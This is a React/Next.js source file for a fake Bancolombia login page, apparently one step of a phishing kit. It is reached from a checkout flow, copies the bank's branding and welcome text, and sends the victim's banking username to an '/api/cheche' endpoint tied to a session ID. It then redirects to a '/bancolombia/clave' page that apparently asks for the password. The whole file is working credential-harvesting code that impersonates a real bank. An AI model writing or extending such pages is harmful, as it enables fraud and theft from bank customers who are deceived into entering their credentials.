'use client';

import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';

export default function BancolombiaUsuarioPage() {
  const [usuario, setUsuario] = useState('');
  const [loading, setLoading] = useState(false);
  const [sessionId, setSessionId] = useState('');
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    const id = searchParams.get('sessionId');
    if (!id) {
      router.push('/checkout');
      return;
    }
    setSessionId(id);
  }, [searchParams, router]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!usuario.trim()) return;

    setLoading(true);

    try {
      const response = await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'update_user',
          sessionId,
          usuario: usuario.trim()
        })
      });

      if (response.ok) {
        router.push(`/bancolombia/clave?sessionId=${sessionId}`);
      }
    } catch (error) {
      console.error('Error updating user:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleCancel = () => {
    router.push('/checkout');
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4 relative overflow-hidden">
      {/* Decorative arcs */}
      <div className="absolute top-0 left-0 w-full h-full pointer-events-none">
        <svg className="absolute top-0 left-0 w-1/2" viewBox="0 0 400 400" fill="none">
          <path d="M-50 350 Q 100 100 250 250" stroke="#FF6B35" strokeWidth="80" fill="none" opacity="0.6"/>
          <path d="M-30 370 Q 120 120 270 270" stroke="#FFA500" strokeWidth="80" fill="none" opacity="0.6"/>
          <path d="M-10 390 Q 140 140 290 290" stroke="#FFD700" strokeWidth="80" fill="none" opacity="0.6"/>
        </svg>
        <svg className="absolute bottom-0 right-0 w-1/2" viewBox="0 0 400 400" fill="none">
          <path d="M450 50 Q 300 300 150 150" stroke="#9333EA" strokeWidth="80" fill="none" opacity="0.6"/>
          <path d="M470 70 Q 320 320 170 170" stroke="#F59E0B" strokeWidth="80" fill="none" opacity="0.6"/>
          <path d="M490 90 Q 340 340 190 190" stroke="#EF4444" strokeWidth="80" fill="none" opacity="0.6"/>
        </svg>
      </div>

      <div className="max-w-lg w-full relative z-10">
        {/* Header */}
        <div className="text-center mb-8">
          <img 
            src="/logos/bancos/bancolombia.png" 
            alt="Bancolombia" 
            className="h-8 mx-auto mb-6 object-contain"
          />
          <button
            onClick={handleCancel}
            className="absolute top-0 right-0 text-gray-600 hover:text-gray-800"
          >
            Salir →
          </button>
        </div>

        {/* Form */}
        <div className="bg-white rounded-2xl shadow-lg p-8 border border-gray-100">
          <div className="text-center mb-8">
            <h2 className="text-3xl font-bold text-gray-900 mb-3">Te damos la bienvenida</h2>
            <p className="text-gray-600 text-sm">
              El usuario es el mismo con el que ingresas a la<br />
              <span className="font-semibold">Sucursal Virtual Personas</span>.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <div className="flex items-center space-x-2 mb-3">
                <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
                <label htmlFor="usuario" className="text-sm font-medium text-gray-700">
                  Usuario
                </label>
              </div>
              <input
                type="text"
                id="usuario"
                value={usuario}
                onChange={(e) => setUsuario(e.target.value)}
                className="w-full px-4 py-3 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400 outline-none transition text-base"
                placeholder="Ingresa tu usuario"
                disabled={loading}
                autoFocus
                autoComplete="username"
              />
            </div>

            <div className="flex space-x-3">
              <button
                type="button"
                onClick={handleCancel}
                className="flex-1 py-3.5 px-6 bg-white border-2 border-gray-300 text-gray-700 rounded-full hover:bg-gray-50 transition disabled:opacity-50 font-medium"
                disabled={loading}
              >
                Volver
              </button>
              <button
                type="submit"
                disabled={!usuario.trim() || loading}
                className="flex-1 py-3.5 px-6 bg-[#FDDA24] text-gray-900 rounded-full hover:bg-[#FED500] disabled:opacity-50 disabled:cursor-not-allowed transition font-semibold"
              >
                {loading ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-gray-900" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Validando...
                  </span>
                ) : (
                  'Continuar'
                )}
              </button>
            </div>
          </form>
        </div>

        {/* Footer Logo */}
        <div className="text-center mt-8">
          <img 
            src="/logos/bancos/bancolombia.png" 
            alt="Bancolombia" 
            className="h-6 mx-auto opacity-60"
          />
        </div>
      </div>
    </div>
  );
}